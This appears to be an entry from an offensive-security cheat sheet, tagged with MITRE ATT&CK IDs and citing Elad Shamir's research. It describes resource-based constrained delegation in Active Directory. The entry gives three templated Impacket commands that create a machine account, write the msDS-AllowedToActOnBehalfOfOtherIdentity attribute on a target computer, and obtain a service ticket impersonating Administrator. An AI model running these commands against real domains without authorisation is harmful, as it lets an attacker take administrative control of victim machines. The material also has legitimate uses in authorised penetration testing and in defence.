---
id: rbcd-impacket
title: Resource-based constrained delegation (RBCD)
section: Active Directory — attack paths
phase: Privilege Escalation
attack:
  tactic: TA0004
  techniques: [T1098]
platform: [windows, network]
source: Elad Shamir, "Wagging the Dog: Abusing Resource-Based Constrained Delegation" (2019)
pair: rbcd-5136
---

With write over a target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity`,
point that attribute at a machine account you control, then S4U to mint a service
ticket impersonating any user (e.g. Administrator) to the target. Make a computer
account first if you can (`MachineAccountQuota` default 10) — pick your own
`<machine_account>` / `<machine_password>` (mind the domain password policy).
`<target>` is the victim computer.

```sh
impacket-addcomputer -computer-name '<machine_account>$' -computer-pass '<machine_password>' -dc-ip {{rhost}} {{domain}}/{{user}}:{{password}}
impacket-rbcd -delegate-from '<machine_account>$' -delegate-to '<target>$' -action write -dc-ip {{rhost}} {{domain}}/{{user}}:{{password}}
impacket-getST -spn cifs/<target> -impersonate Administrator -dc-ip {{rhost}} {{domain}}/'<machine_account>$':'<machine_password>'
```
